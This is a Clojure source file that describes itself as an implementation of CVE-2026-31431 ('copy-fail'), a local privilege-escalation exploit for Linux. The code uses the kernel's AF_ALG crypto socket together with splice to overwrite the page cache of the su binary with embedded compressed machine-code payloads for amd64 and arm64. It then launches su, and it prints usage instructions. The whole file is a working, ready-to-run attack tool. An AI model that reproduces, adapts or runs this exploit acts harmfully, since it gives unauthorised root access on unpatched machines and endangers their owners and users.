(ns copyfail.core
  (:gen-class)
  (:require [clojure.java.io :as io]
            [clojure.string :as str])
  (:import [java.io ByteArrayInputStream ByteArrayOutputStream]
           [java.lang.foreign Arena FunctionDescriptor Linker Linker$Option MemoryLayout MemorySegment SymbolLookup ValueLayout]
           [java.lang.invoke MethodHandle]
           [java.nio ByteOrder]
           [java.util HexFormat]
           [java.util.zip InflaterInputStream]))

(def ^:private af-alg 38)
(def ^:private sock-seqpacket 5)
(def ^:private sol-alg 279)
(def ^:private alg-set-key 1)
(def ^:private alg-set-iv 2)
(def ^:private alg-set-op 3)
(def ^:private alg-set-aead-assoclen 4)
(def ^:private alg-set-aead-authsize 5)
(def ^:private msg-more 32768)
(def ^:private o-rdonly 0)

(def ^:private payloads-zlib-hex
  {"amd64" "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
   "arm64" "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578"})

(def ^:private hex-format (HexFormat/of))
(def ^:private byte-layout ValueLayout/JAVA_BYTE)
(def ^:private int-layout (.withOrder ValueLayout/JAVA_INT (ByteOrder/nativeOrder)))
(def ^:private long-layout (.withOrder ValueLayout/JAVA_LONG (ByteOrder/nativeOrder)))
(def ^:private address-layout ValueLayout/ADDRESS)

(def ^:private linker (delay (Linker/nativeLinker)))
(def ^:private libc (delay (SymbolLookup/libraryLookup "libc.so.6" (Arena/global))))

(defn- libc-symbol [name]
  (let [sym (.find ^SymbolLookup @libc name)]
    (when-not (.isPresent sym)
      (throw (ex-info (str "libc symbol not found: " name) {:symbol name})))
    (.get sym)))

(defn- fd [return-layout & arg-layouts]
  (FunctionDescriptor/of return-layout (into-array MemoryLayout arg-layouts)))

(defn- downcall ^MethodHandle [name ^FunctionDescriptor descriptor]
  (.downcallHandle ^Linker @linker
                   ^MemorySegment (libc-symbol name)
                   descriptor
                   (make-array Linker$Option 0)))

(def ^:private socket-h
  (delay (downcall "socket" (fd int-layout int-layout int-layout int-layout))))
(def ^:private bind-h
  (delay (downcall "bind" (fd int-layout int-layout address-layout int-layout))))
(def ^:private setsockopt-h
  (delay (downcall "setsockopt" (fd int-layout int-layout int-layout int-layout address-layout int-layout))))
(def ^:private accept4-h
  (delay (downcall "accept4" (fd int-layout int-layout address-layout address-layout int-layout))))
(def ^:private sendmsg-h
  (delay (downcall "sendmsg" (fd long-layout int-layout address-layout int-layout))))
(def ^:private pipe-h
  (delay (downcall "pipe" (fd int-layout address-layout))))
(def ^:private splice-h
  (delay (downcall "splice" (fd long-layout int-layout address-layout int-layout address-layout long-layout int-layout))))
(def ^:private read-h
  (delay (downcall "read" (fd long-layout int-layout address-layout long-layout))))
(def ^:private close-h
  (delay (downcall "close" (fd int-layout int-layout))))
(def ^:private open-h
  (delay (downcall "open" (fd int-layout address-layout int-layout))))

(defn- coerce-arg [^Class param-type arg]
  (cond
    (= Integer/TYPE param-type) (int arg)
    (= Long/TYPE param-type) (long arg)
    :else arg))

(defn- coerce-args [^MethodHandle handle args]
  (let [param-types (seq (.parameterArray (.type handle)))]
    (java.util.ArrayList. (map coerce-arg param-types args))))

(defn- invoke-int [^MethodHandle handle & args]
  (int (.invokeWithArguments handle ^java.util.List (coerce-args handle args))))

(defn- invoke-long [^MethodHandle handle & args]
  (long (.invokeWithArguments handle ^java.util.List (coerce-args handle args))))

(defn- check-nonnegative [what value]
  (when (neg? (long value))
    (throw (ex-info (str what " failed") {:call what :result value})))
  value)

(defn- close-fd [fd]
  (when (and fd (not (neg? (int fd))))
    (invoke-int @close-h (int fd))))

(defn- hex-bytes ^bytes [s]
  (.parseHex hex-format s))

(defn- copy-bytes! [^MemorySegment segment offset ^bytes data]
  (MemorySegment/copy data 0 segment byte-layout (long offset) (alength data)))

(defn- c-string [^Arena arena ^String s]
  (.allocateFrom arena s))

(defn- sockaddr-alg ^MemorySegment [^Arena arena]
  (let [segment (.allocate arena 88 8)]
    (.set segment ValueLayout/JAVA_SHORT 0 (short af-alg))
    (copy-bytes! segment 2 (.getBytes "aead"))
    (.set segment int-layout 16 0)
    (.set segment int-layout 20 0)
    (copy-bytes! segment 24 (.getBytes "authencesn(hmac(sha256),cbc(aes))"))
    segment))

(defn- cmsg-space [data-len]
  (let [align 8
        n (+ 16 data-len)]
    (* align (quot (+ n (dec align)) align))))

(defn- write-cmsg! [^MemorySegment segment offset level typ ^bytes data]
  (let [len (+ 16 (alength data))]
    (.set segment long-layout offset (long len))
    (.set segment int-layout (+ offset 8) (int level))
    (.set segment int-layout (+ offset 12) (int typ))
    (copy-bytes! segment (+ offset 16) data)
    (+ offset (cmsg-space (alength data)))))

(defn- append-cmsg! [offset segment level typ data]
  (write-cmsg! segment offset level typ data))

(defn- oob-segment ^MemorySegment [^Arena arena]
  (let [op (byte-array 4)
        iv (byte-array 20)
        assoc (byte-array [(byte 8) (byte 0) (byte 0) (byte 0)])
        _ (aset-byte iv 0 (byte 0x10))
        size (+ (cmsg-space (alength op))
                (cmsg-space (alength iv))
                (cmsg-space (alength assoc)))
        segment (.allocate arena size 8)]
    (-> 0
        (append-cmsg! segment sol-alg alg-set-op op)
        (append-cmsg! segment sol-alg alg-set-iv iv)
        (append-cmsg! segment sol-alg alg-set-aead-assoclen assoc))
    segment))

(defn- msghdr-segment ^MemorySegment [^Arena arena ^MemorySegment data ^MemorySegment oob]
  (let [iov (.allocate arena 16 8)
        msg (.allocate arena 56 8)]
    (.set iov address-layout 0 data)
    (.set iov long-layout 8 (.byteSize data))
    (.set msg address-layout 0 MemorySegment/NULL)
    (.set msg int-layout 8 0)
    (.set msg address-layout 16 iov)
    (.set msg long-layout 24 1)
    (.set msg address-layout 32 oob)
    (.set msg long-layout 40 (.byteSize oob))
    (.set msg int-layout 48 0)
    msg))

(defn- write-chunk! [file-fd offset ^bytes chunk]
  (let [sock-fd (atom -1)
        op-fd (atom -1)
        pipe-r (atom -1)
        pipe-w (atom -1)]
    (with-open [arena (Arena/ofConfined)]
      (try
        (reset! sock-fd (check-nonnegative "socket"
                                           (invoke-int @socket-h af-alg sock-seqpacket 0)))
        (check-nonnegative "bind"
                           (invoke-int @bind-h @sock-fd (sockaddr-alg arena) 88))
        (let [key (hex-bytes (str "0800010000000010" (apply str (repeat 64 "0"))))
              key-seg (.allocate arena (alength key) 1)
              authsize (.allocate arena 4 4)]
          (copy-bytes! key-seg 0 key)
          (.set authsize int-layout 0 4)
          (check-nonnegative "setsockopt(ALG_SET_KEY)"
                             (invoke-int @setsockopt-h @sock-fd sol-alg alg-set-key key-seg (alength key)))
          (check-nonnegative "setsockopt(ALG_SET_AEAD_AUTHSIZE)"
                             (invoke-int @setsockopt-h @sock-fd sol-alg alg-set-aead-authsize authsize 4)))
        (reset! op-fd (check-nonnegative "accept4"
                                         (invoke-int @accept4-h @sock-fd MemorySegment/NULL MemorySegment/NULL 0)))
        (let [msg-bytes (byte-array (+ 4 (alength chunk)))
              _ (System/arraycopy (.getBytes "AAAA") 0 msg-bytes 0 4)
              _ (System/arraycopy chunk 0 msg-bytes 4 (alength chunk))
              data (.allocate arena (alength msg-bytes) 1)
              oob (oob-segment arena)
              msg (msghdr-segment arena data oob)]
          (copy-bytes! data 0 msg-bytes)
          (check-nonnegative "sendmsg"
                             (invoke-long @sendmsg-h @op-fd msg msg-more)))
        (let [pipe-fds (.allocate arena 8 4)]
          (check-nonnegative "pipe" (invoke-int @pipe-h pipe-fds))
          (reset! pipe-r (.get pipe-fds int-layout 0))
          (reset! pipe-w (.get pipe-fds int-layout 4)))
        (let [splice-len (+ offset 4)
              file-offset (.allocate arena 8 8)]
          (.set file-offset long-layout 0 0)
          (check-nonnegative "splice(file->pipe)"
                             (invoke-long @splice-h file-fd file-offset @pipe-w MemorySegment/NULL splice-len 0))
          (check-nonnegative "splice(pipe->socket)"
                             (invoke-long @splice-h @pipe-r MemorySegment/NULL @op-fd MemorySegment/NULL splice-len 0)))
        (let [buf (.allocate arena (+ 8 offset) 1)]
          (invoke-long @read-h @op-fd buf (.byteSize buf)))
        (finally
          (close-fd @pipe-r)
          (close-fd @pipe-w)
          (close-fd @op-fd)
          (close-fd @sock-fd))))))

(defn- decompress ^bytes [^bytes data]
  (with-open [in (InflaterInputStream. (ByteArrayInputStream. data))
              out (ByteArrayOutputStream.)]
    (io/copy in out)
    (.toByteArray out)))

(defn- arch []
  (case (System/getProperty "os.arch")
    ("amd64" "x86_64") "amd64"
    ("aarch64" "arm64") "arm64"
    (System/getProperty "os.arch")))

(defn- resolve-su []
  (let [fallback (io/file "/usr/bin/su")]
    (cond
      (.exists fallback) (.getPath fallback)
      :else (some (fn [dir]
                    (let [f (io/file dir "su")]
                      (when (and (.exists f) (.canExecute f))
                        (.getPath f))))
                  (str/split (or (System/getenv "PATH") "") #":")))))

(defn- print-help []
  (binding [*out* *err*]
    (println "Usage: java --enable-native-access=ALL-UNNAMED -jar copyfail-0.1.0-standalone.jar [-h|--help]")
    (println)
    (println "Clojure implementation of CVE-2026-31431 (copy-fail).")
    (println "Overwrites the page cache of su and runs su.")
    (println "See https://copy.fail for information.")))

(defn- run-su []
  (let [process (-> (ProcessBuilder. ["su"])
                    (.inheritIO)
                    (.start))
        exit-code (.waitFor process)]
    (when-not (zero? exit-code)
      (throw (ex-info (str "su exited with status " exit-code) {:exit-code exit-code})))))

(defn -main [& args]
  (try
    (when (some #{"-h" "--help" "-help"} args)
      (print-help)
      (System/exit 0))
    (when-not (= "Linux" (System/getProperty "os.name"))
      (throw (ex-info "Unsupported OS: this implementation requires Linux" {})))
    (let [arch-name (arch)
          payload-hex (get payloads-zlib-hex arch-name)]
      (when-not payload-hex
        (throw (ex-info (str "Unsupported architecture: " arch-name " (need amd64 or arm64)") {})))
      (let [payload (decompress (hex-bytes payload-hex))
            su-path (or (resolve-su)
                        (throw (ex-info "su not found in PATH and not at /usr/bin/su" {})))
            file-fd (check-nonnegative "open"
                                       (with-open [arena (Arena/ofConfined)]
                                         (invoke-int @open-h (c-string arena su-path) o-rdonly)))]
        (try
          (println (format "Overwriting page cache of %s with %d bytes" su-path (alength payload)))
          (doseq [i (range 0 (alength payload) 4)]
            (let [end (min (+ i 4) (alength payload))
                  chunk (byte-array (- end i))]
              (System/arraycopy payload i chunk 0 (alength chunk))
              (write-chunk! file-fd i chunk)
              (when (zero? (mod i 100))
                (println (format "  ... wrote %d bytes" (min (+ i 4) (alength payload)))))))
          (println (format "  ... wrote %d bytes" (alength payload)))
          (println "Executing payload")
          (run-su)
          (finally
            (close-fd file-fd)))))
    (catch Throwable t
      (binding [*out* *err*]
        (println (.getMessage t)))
      (System/exit 1))))
